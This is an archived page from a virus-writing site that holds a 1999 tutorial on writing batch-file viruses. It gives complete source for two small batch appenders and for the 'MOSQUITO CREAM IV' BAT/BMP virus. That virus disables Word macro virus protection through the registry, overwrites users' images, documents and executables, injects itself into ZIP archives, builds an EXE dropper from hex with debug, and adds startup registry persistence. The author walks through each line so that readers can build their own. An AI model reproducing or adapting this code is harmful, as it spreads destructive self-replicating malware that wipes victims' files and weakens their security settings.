<html><head>
<title>VX Heavens : LineZer0</title>
</head>
<body text=#000000 bgcolor=#ffffff>
<script language="JAVASCRIPT">
<!--
if (navigator.onLine){
document.write("<!-- Spidersoft WebZIP Ad Banner Insert -->");
document.write("<TABLE width=100% border=0 cellpadding=0 cellspacing=0>");
document.write("<TR>");
document.write("<TD>");
document.write("<ILAYER id=ad1 visibility=hidden height=60></ILAYER>");
document.write("<NOLAYER>");
document.write("<IFRAME SRC='http://www.spidersoft.com/ads/bwz468_60.htm' width=100% height=60 marginwidth=0 marginheight=0 hspace=0 vspace=0 frameborder=0 scrolling=no></IFRAME>");
document.write("</NOLAYER>");
document.write("</TD>");
document.write("</TR>");
document.write("</TABLE>");
document.write("<!-- End of Spidersoft WebZIP Ad Banner Insert-->");
}
 //-->
</script>
<h2>BATch virii tutorial</h2><pre>
<-------------------------//LineZer0 Network 99\\------------------------->
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=

Special guest presents:

    
    ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
    :  __ _     __                        __ _                       :
    : / _\ |_  /__\ __ _  /\/\   ___   /\ \ (_)/\ /\ _ __ ___   /    :
    : \ \| __|/ \/// _` |/    \ / _ \ /  \/ / / / \ \ '_ ` _ \       :
    : _\ \ |_/ _  \ (_| / /\/\ \ (_) / /\  /| \ \_/ / | | | | |      :
    : \__/\__\/ \_/\__,_\/    \/\___/\_\ \/ |_|\___/|_| |_| |_|  s   :
    :                                                                :
    :   BATch virii tutorial                                         :
    ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
    

Utils you will need:

Wordpad for win95/98 ;
the best TEXT editor!

Batch is a language created and used in MS-DOS;a batch file is a DOS script.
Well, firstly we should define the concept of "script".
A script is basically a sequence of commands, writed for example on a "txt"
that will be RENamed as "any_filename" with the appropriate extension, for 
a prog-interpreter (the extension depends by the prog-interpreter of the
script).

A batch file is a file (DOS script) that contain a list of istructions to 
give to "COMMAND.COM",the interpreter of MS-DOS os,the commands to perform
some actions, such as DELeting a file,REName a file,START a progam, or 
FORMAT a specified drive. 

Most batch virii use very simple means of copying and spreding. They will 
just append their code at the end of other *.bat in the hopes they will be
ran.

Now,          
                       -=LET THE DAMAGE BEGIN=- ;-)


Example:


MMMMMMMMMMMMMMMMMMMMMMM   "_!" by Wavefunc   MMMMMMMMMMMMMMMMMMMMMMM

  @ctty nul._!                                                
  for %%a in (*.bat ..\*.bat) do set _!=%%a                   
  find "_!"<%_!%                                              
  if errorlevel 1 find "_!"<%0.BAT>>%_!%                      
  ctty con._!                                                 

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

This is an example of a little "BATCH APPENDER", and now, some comments:



@    - when this in position 1 in front of the command, @ prevents the 
       command from being echoed to the console, even if echo is on.

CTTY - changes terminal device used by the computer

NUL  - sends the output of the file to nowhere

%%a  - scan for batches and for each one found call program in the variable
       then the name of the batch to check (%%a). 

FIND - in this case check to see if the virus is present in target

IF ERRORLEVEL 1 - branch "if" there, get the next filename

%0 - This is the "identity" of the script  if i make a batch with 
     "ren %0 TEST.TXT", and the batch was previously named 
     "GOOD_DAY.BAT" ( or something else), after run it, i'll obtain 
     that he rename HIMSELF as TEST.TXT

>>   - appends the output to the end of a file

>    - overwrite with the output a declared file 

Like many HLL's you can use very "Structured programming" in the form of 
subs and loops with if lines for all error handling, much like Qbasic.
Advanced batch virii can also rename a binary then copy itself to a batch 
with the same name (companion virii).

They may use machine code to drop or hide payloads such as *.com files thru
debugger, and may also use ansi bombs as a destructive payload.

Makeing the "trojan" able to reproduce itself.

The same action performed by this little BATch, could be obtained by this
below:


********************" SgrullerZ_Vir " by StRaMoNiUm *****************

  @ECHO OFF
  FOR %%i IN (*.BAT ../*.BAT) do COPY %%i+%0 %%i>nul
  ECHO What's a Sgruller ???
  cls

*********************************************************************

Let me begin the description of this little "virus" :)

@ECHO OFF 

The ECHO command must be "OFF" to avoid, in case of a BATch script the 
"visualization" of the commands in the script; it's like "CTTY NUL", but,
this istruction not change terminal device used for the visualization of 
the output, simply it give the command "no visible line command on the 
screen" :)

ECHO

I think that this command is something basilar in a dos script; it's 
function is simply do the "echo" of something after the command
(ex:ECHO What's a Sgruller ??? will do, in a dos shell   "What's a 
Sgruller ???"),it's a simple command but it could be used, in combination
with ">>" command, to make a 2=0nd BAT  ;-)

FOR %%i IN (*.BAT ../*.BAT) DO COPY %%i+%0 %%i>nul

This is a simple but effective and very powerful command too.
It will perform this action: FOR each type of file "declared" IN 
(*extensions or file path or file name, in this case "BAT"), setted as 
"%%i" DO (perform) this kind of action (ex: del, ren, and so on;in this 
case copy %%i+%0) for all declared file (%%i) *

*look at the differences between " %%i" "%%b"
using %%i the action will be performed at the same time for each file found;
using %%b the action will be performed only when the previous file 
operation is done;

IF %1 

-Branches if 1st parm

IF EXIST

-Branches if file is there

IF NOT EXIST

-Branches if not there

FIND  

-Check to see if the virus is present in target

ATTRIB

-With this command u will be able to "hide" some files (ATTRIB FILE.EXE +h)
,make them "read only" (ATTRIB FILE.EXT +r) and not modifiable in any way 
until u set the file "not" read only (ATTRIB FILE.EXT -r).These are the
principal options about ATTRIB that we must know and use to make our 
little-lamah-virii :)

SET

Set the variables (Ex: SET RAMADAN=C:\WINDOWS\Telnet.exe, now, u can run
C:\WINDOWS\Telnet.exe, typing in a dos shell " %RAMADAN% " <Enter> )

NUL

Sends the output of the file to nowhere

TYPE

Print a specified file on the screen or on a "output" file
(Ex: "Type c:\Autoexec.bat>>OUTPUT_File.EXT" )

EXIT

Stop the execution of other commands in a script after it

CLS

Clear the output screen, at the end of a script;
if present and there aren't other istructions, it will close the shell ;-)

Now, something more advanced;
This is my MO§QUITO_CREAM IV BAT/BMP virus, the first BAT/BMP infector 

BM® .. . etc.. etc.. (this is the code of a BMP image, enclosed in the zip,
at the beginning of the batch)

@cls 
@echo off
:: MO§QUITO CREAM IV By StRaMoNiUm
@break off
ECHO REGEDIT4>%windir%\BZz.reg
ECHO.>>%windir%\BZz.reg
ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]>>%windir%\BZz.reg
ECHO "RegisteredOwner"="MO§QUITO CREAM IV">>%windir%\BZz.reg
ECHO "RegisteredOrganization"="By StRaMoNiUm©">>%windir%\BZz.reg
ECHO [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]>>%windir%\BZz.reg
ECHO "EnableMacroVirusProtection"="0">>%windir%\BZz.reg
@REGEDIT /S /C %windir%\BZz.reg
@attrib %windir%\*.* -h -r -s
@attrib %windir%\Desktop\*.* -h -r -s
@attrib %windir%\web\*.* -h -r -s
@attrib C:\Docume~1\*.* -h -r -s
for %%i in (%windir%\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i>nul
for %%i in (%windir%\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (%windir%\Desktop\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i>nul
for %%i in (%windir%\Desktop\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (%windir%\WEB\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i>nul
for %%i in (%windir%\WEB\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (C:\Docume~1\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i>nul
for %%i in (C:\Docume~1\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (C:\Mydocu~1\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i>nul
for %%i in (C:\Mydocu~1\*.gif,*.jpg) do ren %%i *.bmp>nul
echo    MOSQUITO CREAM  IV       >x
echo.                           >>x 
echo               \\           >>x
echo             OooO@-         >>x
echo               //           >>x
echo.                           >>x
echo  # ITALIAN PRODUCTION 1999 #         By StRaMoNiUm>>x
@move x %tmp%\x
@if exist *.zip goto :BZzip
@if not exist *.zip goto :BZskip
:BuZZ
@move Bz.Z %tmp%\Setup.exe>nul
@copy %0 %tmp%\Setup.BMP>nul
@if exist Pkzip.exe goto :Bzext
@if not exist Pkzip.exe goto :BzrZ
:Bzext
for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.exe>nul
for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.BMP>nul
goto :BZskip
:BzrZ
for %%i in (*.zip ..\*.zip) do start /m winzip32 -a /%%i "%tmp%\Setup.exe" "%tmp%\Setup.BMP">nul
goto :BZskip
:BZskip
for %%i in (*.bmp,*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf,*.bat ..\*.bat,*.bmp) do copy %0 %%i>nul
for %%i in (*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf) do ren %%i *.bmp>nul
for %%i in (s*.exe,a*.exe,b*.exe,o*.exe,i*.exe,_*.exe) do copy %0 %%i>nul
for %%i in (*.txt,*.doc,*.rtf ..\*.txt,*.doc,*.rtf) do copy %tmp%\x %%i>nul
cd..
@attrib *.* -h -r -s
for %%i in (*.bmp,*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf,*.bat ..\*.bat,*.bmp) do copy %0 %%i>nul
for %%i in (*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf) do ren %%i *.bmp>nul
for %%i in (s*.exe,a*.exe,b*.exe,o*.exe,i*.exe,_*.exe) do copy %0 %%i>nul
for %%i in (*.txt,*.doc,*.rtf ..\*.txt,*.doc,*.rtf) do copy %%i+%tmp%\x %%i>nul
@if exist *.zip goto :BZzip
@if not exist *.zip goto :BZskip2
:BZskip2
@REGEDIT /E %windir%\BZs.reg HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2>nul
ECHO "0A StRaMoNiUm"="c:\\command /C ren C:\\Mosquito.bmp Mosquito.bat|CLS">>%windir%\BZs.reg
ECHO "1A Dark_Elf"="start /m C:\\Mosquito.bat">>%windir%\BZs.reg
echo.
echo jgcxjhgkjhcxgkjdhflkgjhxhjxhjjjhjkfjjkhjhjfjjhjjhj>nul
echo.
echo ciyjouigydujujhgfkjbkjhgdkjhgjhjugkjghkdjhykugrhtiug>nul
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,1>nul
echo.
@regedit /S /C %windir%\BZs.reg
@cls
@type %tmp%\x
for %%i in (%tmp%\*.*) do DEL %%i>nul
@copy %0 c:\MOSQUITO.BMP>nul
@copy %0 %windir%\DVC.EXE>nul
ECHO @Echo off>%windir%\WIN.BAT
ECHO @if exist c:\Mosquito.bat goto :BZ>>%windir%\WIN.BAT
ECHO @if not exist c:\Mosquito.bat goto :BZXT
ECHO :BZXT>>%windir%\WIN.BAT
ECHO @ren DVC.EXE BZz.bat>>%windir%\WIN.BAT
ECHO @copy BZz.bat DVC.EXE>>%windir%\WIN.BAT
ECHO @start /m BZz.bat>>%windir%\WIN.BAT
ECHO :BZ>>%windir%\WIN.BAT
ECHO CLS>>%windir%\WIN.BAT
ren %0 Mosquito.BMP|cls
exit
:BZzip
ECHO n BZ.Z>%tmp%\bzz.z
ECHO e 100 4D 5A E2 01 02 00 00 00 02 00 C3 0F FF FF F0 FF>>%tmp%\bzz.z
ECHO e 110 FE FF 00 00 00 01 F0 FF 1C 00 00 00 00 00 00 00>>%tmp%\bzz.z
ECHO e 120 FC BD 20 01 8B 6E 00 8B A6 02 00 8B 9E 04 00 B4>>%tmp%\bzz.z
ECHO e 130 4A CD 21 A1 2C 00 89 86 1A 00 8B 9E 00 00 FF E3>>%tmp%\bzz.z
ECHO e 140 40 04 C7 86 10 00 FF FF 8B D6 33 C9 B8 02 3C 0B>>%tmp%\bzz.z
ECHO e 150 FF 74 02 FE C4 CD 21 72 29 8B D8 0B FF 74 0B B8>>%tmp%\bzz.z
ECHO e 160 02 42 33 D2 8B CA CD 21 72 18 89 9E 12 00 53 B4>>%tmp%\bzz.z
ECHO e 170 45 BB 01 00 CD 21 89 86 10 00 B9 01 00 5B B4 46>>%tmp%\bzz.z
ECHO e 180 CD 21 C3 84 01 FE 01 53 E8 00 00 5B 8B FE 4F 1E>>%tmp%\bzz.z
ECHO e 190 8A 86 1E 00 50 FF 57 FA 2E FF 57 F8 58 88 86 1E>>%tmp%\bzz.z
ECHO e 1A0 00 1F 5B C3 53 E8 20 00 00 44 55 4D 4D 59 20 20>>%tmp%\bzz.z
ECHO e 1B0 20 46 43 42 00 00 00 00 00 44 55 4D 4D 59 20 20>>%tmp%\bzz.z
ECHO e 1C0 20 46 43 42 00 00 00 00 5B 1E 06 89 A6 02 00 57>>%tmp%\bzz.z
ECHO e 1D0 56 8B F7 46 8D 3F B8 03 29 CD 21 8D 7F 10 B8 03>>%tmp%\bzz.z
ECHO e 1E0 29 CD 21 5E 5F 0E 8D 57 10 52 0E 8D 17 52 0E 57>>%tmp%\bzz.z
ECHO e 1F0 2E A1 2C 00 50 8B DC B8 00 4B 8B D6 CD 21 BD 20>>%tmp%\bzz.z
ECHO e 200 01 2E 8B 6E 00 8C CB FA 8E D3 8B A6 02 00 FB FC>>%tmp%\bzz.z
ECHO e 210 07 1F B4 4D CD 21 88 86 1E 00 5B C3 14 02 53 E8>>%tmp%\bzz.z
ECHO e 220 07 00 43 4F 4D 53 50 45 43 5B BA 07 00 8B F3 FF>>%tmp%\bzz.z
ECHO e 230 57 FA 5B C3 53 51 57 06 8E 86 1A 00 33 FF 8B DE>>%tmp%\bzz.z
ECHO e 240 8B F3 8B CA F3 A6 74 14 32 C0 B9 FF FF F2 AE 26>>%tmp%\bzz.z
ECHO e 250 80 3D 00 75 EB 8B F7 06 1F F9 EB 19 8B F7 06 1F>>%tmp%\bzz.z
ECHO e 260 AC 3C 3D 75 FB 80 3C 00 74 EB AC 0A C0 72 04 3C>>%tmp%\bzz.z
ECHO e 270 20 72 F7 4E F8 07 5F 59 5B C3 83 BE 10 00 FF 74>>%tmp%\bzz.z
ECHO e 280 13 B4 46 8B 9E 10 00 B9 01 00 CD 21 B4 3E 8B 9E>>%tmp%\bzz.z
ECHO e 290 12 00 CD 21 C3 67 01 D8 03 E8 03 84 01 2B 04 53>>%tmp%\bzz.z
ECHO e 2A0 E8 32 00 00 50 41 54 48 3D 43 4F 4D 45 58 45 42>>%tmp%\bzz.z
ECHO e 2B0 41 54 00 00 00 00 42 61 64 20 63 6F 6D 6D 61 6E>>%tmp%\bzz.z
ECHO e 2C0 64 20 6F 72 20 66 69 6C 65 20 6E 61 6D 65 0D 0A>>%tmp%\bzz.z
ECHO e 2D0 00 2F 43 20 00 5B 89 77 0F 89 7F 11 8B 96 0A 00>>%tmp%\bzz.z
ECHO e 2E0 83 C2 04 C6 47 31 00 C6 07 00 8B FA 33 C9 0A 0F>>%tmp%\bzz.z
ECHO e 2F0 75 73 52 56 33 D2 80 7C 01 3A 75 0D 8A 14 80 E2>>%tmp%\bzz.z
ECHO e 300 DF 80 EA 40 A5 83 47 0F 02 80 3C 5C 74 1C B0 5C>>%tmp%\bzz.z
ECHO e 310 AA 56 8B F7 B4 47 CD 21 5E 32 C0 B9 40 00 F2 AE>>%tmp%\bzz.z
ECHO e 320 4F 80 7D FF 5C 74 03 B0 5C AA 33 C0 AC 3D 2E 2E>>%tmp%\bzz.z
ECHO e 330 75 0E FD B0 5C B9 12 00 F2 AE F2 AE FC 47 EB EC>>%tmp%\bzz.z
ECHO e 340 AA 8A E0 3C 5C 75 03 FE 47 31 3C 00 75 DE 4F 8B>>%tmp%\bzz.z
ECHO e 350 D7 FD B9 05 00 B0 2E F2 AE FC 75 03 47 8B D7 8B>>%tmp%\bzz.z
ECHO e 360 FA 5E 5A EB 25 80 7F 31 00 75 08 8B 77 0F FF 57>>%tmp%\bzz.z
ECHO e 370 F6 73 08 8D 77 13 FF 57 F4 EB 7B B9 49 00 AC 3C>>%tmp%\bzz.z
ECHO e 380 20 76 07 3C 2E 74 03 AA E2 F4 B0 2E AA 8D 77 06>>%tmp%\bzz.z
ECHO e 390 B9 03 00 A5 A4 32 C0 AA 52 56 51 8B F2 FF 57 FA>>%tmp%\bzz.z
ECHO e 3A0 59 5E 5A 73 0A 83 EF 04 E2 E9 FE 07 E9 3B FF 83>>%tmp%\bzz.z
ECHO e 3B0 F9 01 75 33 8D 77 2E 83 EA 03 8B FA A5 A4 32 C0>>%tmp%\bzz.z
ECHO e 3C0 B9 FC 00 F2 AE C6 45 FF 20 8B 77 11 38 4C FF 77>>%tmp%\bzz.z
ECHO e 3D0 03 8A 4C FF F3 A4 C6 05 0D 8B F2 8B C7 2B C2 88>>%tmp%\bzz.z
ECHO e 3E0 44 FF FF 57 F2 EB 0F 8B 7F 11 4F FE 0D 57 8B F2>>%tmp%\bzz.z
ECHO e 3F0 FF 57 F8 5F FE 05 5B C3 8A 14 46 0A D2 74 06 B4>>%tmp%\bzz.z
ECHO e 400 02 CD 21 EB F3 C3 14 02 53 E8 04 00 50 41 54 48>>%tmp%\bzz.z
ECHO e 410 5B 52 56 1E BA 04 00 8B F3 FF 57 FA 49 E3 0B AC>>%tmp%\bzz.z
ECHO e 420 0A C0 74 24 3C 3B 75 F7 EB F2 AC 3C 3B 74 07 0A>>%tmp%\bzz.z
ECHO e 430 C0 74 03 AA EB F4 0E 1F 26 80 7D FF 5C 74 03 B0>>%tmp%\bzz.z
ECHO e 440 5C AA F8 1F 5E 5A 5B C3 F9 EB F8 8B D7 B4 1A CD>>%tmp%\bzz.z
ECHO e 450 21 8B D6 33 C9 B4 4E CD 21 72 04 83 C7 1E F8 C3>>%tmp%\bzz.z
ECHO e 460 96 04 C2 06 AD 00 C4 06 C5 07 C6 08 C7 09 56 E8>>%tmp%\bzz.z
ECHO e 470 7F 2D 83 C6 04 5F 8B 0E 44 D7 83 E9 04 F3 00 00>>%tmp%\bzz.z
ECHO e 480 6E 75 6C 00 20 2F 43 20 52 45 4E 20 73 65 74 75>>%tmp%\bzz.z
ECHO e 490 70 2E 62 6D 70 20 49 6E 73 74 61 6C 6C 2E 62 61>>%tmp%\bzz.z
ECHO e 4A0 74 20 20 20 20 0D 00 49 4E 53 54 41 4C 4C 2E 62>>%tmp%\bzz.z
ECHO e 4B0 61 74 00 01 0D 00 8D B6 20 00 BF 00 00 B8 22 01>>%tmp%\bzz.z
ECHO e 4C0 FF D0 8D B6 25 00 B8 67 01 FF D0 B8 5A 02 FF D0>>%tmp%\bzz.z
ECHO e 4D0 8D B6 47 00 8D BE 54 00 B8 7F 02 FF D0 B8 00 4C>>%tmp%\bzz.z
ECHO e 4E0 CD 21 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>%tmp%\bzz.z
ECHO e 500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00>>%tmp%\bzz.z
ECHO rcx>>%tmp%\bzz.z
ECHO 410>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO w>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO q>>%tmp%\bzz.z
debug < %tmp%\bzz.z>nul
goto :BuZZ


There are some very interesting things in this NOT TOO LITTLE batch ;)

First of all, we can see a function that, like macro script, could change
some Window$ REGYSTRY_KEYs.
To do this, i have used the common "ECHO" command, the redirection of the 
output ">" and ">>" and some well documented and not, regystry function 
under MS-DOZ 7.0 (win98 dos).
Take a look at this point of code, but first of all, look at this  %WINDIR%

%WINDIR%

%windir% is a default "variable", it means  "THE FOLDER WHERE IS INSTALLED 
WINDOWS"; for example, in case of a batch  with " DEL C:\WINDOWS\WIN.COM"
if the folder where is installed WindoZe have a different name, for example
"XISNEDF" ,  the batch fail his work, but, if u have "DEL %WINDIR%\WIN.COM"
(it means DEL C:\XISNEDF\WIN.COM) WIN.COM will be certainly DELeted .
(hey man…u are a fucked guy!!! ;-> )

ECHO REGEDIT4>%windir%\BZz.reg

This will create an "OUTPUT FILE", BZz.reg, that contain the text "REGEDIT4",
the beginning of a common file "REG"

ECHO.>>%windir%\BZz.reg 

This command cause a "blank" line of ECHO, and it will be added by ">>" to 
the end of BZz.reg, the file previously created

ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]>>%windir%\BZz.reg

This is the same command, it will add the string of "current version" in 
our new REG file with the same command to "append" the output of ECHO 
( ">>")

ECHO "RegisteredOwner"="MO§QUITO CREAM IV">>%windir%\BZz.reg

Here is the part of REG that will change the "registered owner" 
(of windoZe, sure ;>).

...In the same way, we will append the ECHO output to the end of BZz.reg

ECHO "RegisteredOrganization"="By StRaMoNiUm©">>%windir%\BZz.reg

As above, but for the "Registered organization"

ECHO [HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]>>%windir%\BZz.reg
ECHO "EnableMacroVirusProtection"="0">>%windir%\BZz.reg

Finally, in the same way, we made the part of reg that will change the Word
alert when a doc contain a macro to "0", so that NO ALERT WHEN A DOC WITH 
MACRO IS OPENED 

           ATTENTION !

   @REGEDIT /S /C %windir%\BZz.reg   

This is a very important part of all the "REG PROCESS" , it uses an
UNDOCUMENTED DOS FUNCTION:

REGEDIT /S file.reg

Will add the specified REG KEY without any prompt or message window that 
inform the user about what happened!!! (u can use this little function, for
example to make a reg key in "Runservices",so that a prog will be
automatically executed when windows start 

The other functions of regedit, are more useful and well documented too.

REGEDIT /C  file.reg

The content of file.reg will replace the original value in the registry

REGEDIT /L:<path system.dat> 

 Specify the location of  system.dat

REGEDIT /R:<path user.dat> 

Specify the location of user.dat

REGEDIT /E file.reg Complete_reg_key_name

Export into the file "file.reg" all the specifyed key contents of 
^Complete_reg_key_name^, if  not specified any name, it will export 
( in file.reg )  ALL the  registry !

REGEDIT /D Complete_reg_key_name

DELete a key or all a registry's branch
es: REGEDIT /L:<Path system.dat> /R:<Path user.dat> /D file.reg
delete the keys declared in file.reg


@attrib %windir%\*.* -h -r -s
@attrib %windir%\Desktop\*.* -h -r -s
@attrib %windir%\web\*.* -h -r -s
@attrib C:\Docume~1\*.* -h -r -s

With this, i make all the files in c:\WINDOWS, C:\WINDOWS\DESKTOP, C:\WINDOWS\WEB\, C:\DOCUMENTS, -h -r -s (unhided and modifyable in any way)

for %%i in (%windir%\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i>nul
for %%i in (%windir%\*.gif,*.jpg) do ren %%i *.bmp>nul

Overwrite all BMP,GIF,JPG and BAT in c:\windows, with my virus, then rename
GIF and JPG as BMP.
About %0...

%0

This is the "identity" of the script  if i make a batch with 
"ren %0 TEST.TXT", and the batch was previously named "GOOD_DAY.BAT"
( or something else), after run it, i'll obtain that he rename HIMSELF as
TEST.TXT. In my virus, that has a BMP at the beginning of its "code", i 
obtain that the BATCH will be (after renamed)a REAL and VIEWABLE BMP    
(the splatted fly ehehe…)


for %%i in (%windir%\Desktop\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i>nul
for %%i in (%windir%\Desktop\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (%windir%\WEB\*.bmp,*.gif,*.jpg,*.bat) do copy %0 %%i>nul
for %%i in (%windir%\WEB\*.gif,*.jpg) do ren %%i *.bmp>nul
for %%i in (C:\Docume~1\*.bmp,*.gif,*.jpg,*.bat,*.exe) do copy %0 %%i>nul
for %%i in (C:\Docume~1\*.gif,*.jpg) do ren %%i *.bmp>nul

The same as above, but will be overwrited the EXE files too.
P.S Try to rename a bmp as an exe.. cool (but not functional) effect... ;-)))

echo    MOSQUITO CREAM  IV       >x
echo.                           >>x 
echo               \\           >>x
echo             OooO@-         >>x
echo               //           >>x
echo.                           >>x
echo  # ITALIAN PRODUCTION 1999 #         By StRaMoNiUm>>x
@move x %tmp%\x

Now, using ECHO and >> the batch make a little "ascii work" (a fly), then 
move it in the C:\WINDOWS\TEMP folder 

MOVE

U don't need explanation about this, ins't it??? 
However.. with this command u can move a file in a specified directory, if
u specify a different name file in the destination directory, u don't need 
to rename the file after move.

%TMP%

This is another default variable, it means "C:\WINDOWS\TEMP"; in any case 
the name of the temporary folder under windows

@if exist *.zip goto :BZzip
@if not exist *.zip goto :BZskip

Well… now the real innovation 4 a BATch virus ;)
If it found 1 or more files with ZIP extension, it go to label 
:Bzzip.. |CoNtInUe|


GOTO :LABEL

This is a command that direct the batch to a labeled line; for example, in
a batch like this:

@echo off
goto :LABEL_1
echo sucker !
echo sucker !
echo sucker !
echo sucker !
echo sucker !
echo sucker !
:LABEL_1
echo OK !

u can see in the shell, only " OK !" because the other ECHO command was skip
ped by GOTO :LABEL_1, that redirect to the last ECHO line, labeled with 
:LABEL_1 ;)


:BZzip
ECHO n BZ.Z>%tmp%\bzz.z
ECHO e 100 4D 5A E2 01 02 00 00 00 02 00 C3 0F FF FF F0 FF>>%tmp%\bzz.z
ECHO e 110 FE FF 00 .. .. . and so on.. .
ECHO rcx>>%tmp%\bzz.z
ECHO 410>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO w>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO.>>%tmp%\bzz.z
ECHO q>>%tmp%\bzz.z


This is Bzzip label... WHAT A MASS!!! What happened? ehehe 
...simply, now, thru debugger the batch make a little EXE from its HEX 
(hexadecimal) code,(previously created) this is a little exe, (obtained 
with a compiled BAT by BAT2COM, converted in an EXE file with COM2EXE) that
perform this action:

rename setup.bmp as install.bat, then, run install.bat.
Converting hex to a COM file is not straightforward.
U can see in my vir, the general form to do this, and as you can see too, 
you have a bit of editing to do before you can convert hex to a com file. 
The "e" on each line enters data. The next number (like 0100) is the hex 
address. Always start at 100. After that comes the hex data separated by 
spaces. It is customary to put 16 hex numbers per line. This means the next 
address on the next line must be 16 higher (0110 is 16 higher than 0100 
because 0100 and 0110 are HEX address numbers). The "n BZ.Z" is where you
name your file. Finally, the "w" causes your file to be written to the disk,
and "q" quits.

Then the batch:

debug < %tmp%\bzz.z>nul

Pass the debug script "bzz.z" thru debbuger, and make BZ.Z

goto :BuZZ

go to the label " :BuZZ "


:BuZZ
@move Bz.Z %tmp%\Setup.exe>nul
@copy %0 %tmp%\Setup.BMP>nul
@if exist Pkzip.exe goto :Bzext
@if not exist Pkzip.exe goto :BzrZ

Now, move (and, automatically rename  )Bz.z in " C:\WINDOWS\TEMP\" as
"Setup.exe", then copy himself (%0), always in C:\WINDOWS\TEMP\ (%TMP%) 
as Setup.BMP;

if PKZIP.EXE is present in the current dir, it will perform :

for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.exe>nul
for %%i in (*.zip ../*.zip) DO pkzip -e0 -u -r -k %%i %tmp%\Setup.BMP>nul

so that, each zip file in the current dir, will be updated (-u option) with
the file "Setup.exe" and "Setup.BMP" (the dropper and the virus  ), but with
-k option, the date remains the same (-eo is no compression)


:BzrZ
for %%i in (*.zip ..\*.zip) do start /m winzip32 -a /%%i "%tmp%\Setup.exe" "%tmp%\Setup.BMP">nul
goto :Bzskip

Well this fucked function was very hard for me to found ;)
Now, if pkzip.exe is not present, each zip file will be updated with 
WINZIP32.EXE !!!

How many people have pkzip? And how many Winzip ????   
The command and the parameters are not too hard to understand, but the key 
for the success of this "process" is the little "SLASH" 

-> /%%i <-.

If not present, it cause with a long name path of zip files, the WINZIP 
window appear, and the update process is unhided and broken, even if 
there's START /m option   

START

This command tell "RUN" to a specified prog.
There are some options for this command:

/m[inimized] Run the application in background.

/max[imized] Run the application in maximized mode.

/r[estored]  Restore the new application (default mode).

/w[ait]      Wait the finish of the previous application , then return to 
             the next command


:BZskip
for %%i in (*.bmp,*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf,*.bat ..\*.bat,*.bmp) do copy %0 %%i>nul
for %%i in (*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf) do ren %%i *.bmp>nul
for %%i in (s*.exe,a*.exe,b*.exe,o*.exe,i*.exe,_*.exe) do copy %0 %%i>nul
for %%i in (*.txt,*.doc,*.rtf ..\*.txt,*.doc,*.rtf) do copy %tmp%\x %%i>nul
cd..

Well, now we have had the "reproduction" of the virus,and we can proceed 
with its BAD effects ehehheh ;-)

All the bmp,jpg,gif,tga,psd,tif,wmf,bat, will be overwritten, then renamed 
(except for batch) as *.BMP; the TXT,DOC and RTF documents, are overwritten
too, but with my "ASCII WORK", previously created. 

The exe files that begin with "s, a, b, o, i, _" will be overwritten too.
With "CD.." if we are in a subdir, we move in the "principal" folder then..

for %%i in (*.bmp,*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf,*.bat ..\*.bat,*.bmp) do copy %0 %%i>nul
for %%i in (*.jpg,*.gif,*.tga,*.psd,*.tif,*.wmf) do ren %%i *.bmp>nul
for %%i in (s*.exe,a*.exe,b*.exe,o*.exe,i*.exe,_*.exe) do copy %0 %%i>nul
for %%i in (*.txt,*.doc,*.rtf ..\*.txt,*.doc,*.rtf) do copy %%i+%tmp%\x %%i>nul 
@if exist *.zip goto :BZzip
@if not exist *.zip goto :BZskip2

The same process, except for TXT,DOC and RTF, where my ascii work will be 
only "APPENDED"; if is present one or more zip files, will be repeated the
"ZIP process", else go to label ":Bzskip2"

:BZskip2
@REGEDIT /E %windir%\BZs.reg HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2>nul

…a great thing…
the batch create 2 windows registry key, to run himself when windows start.
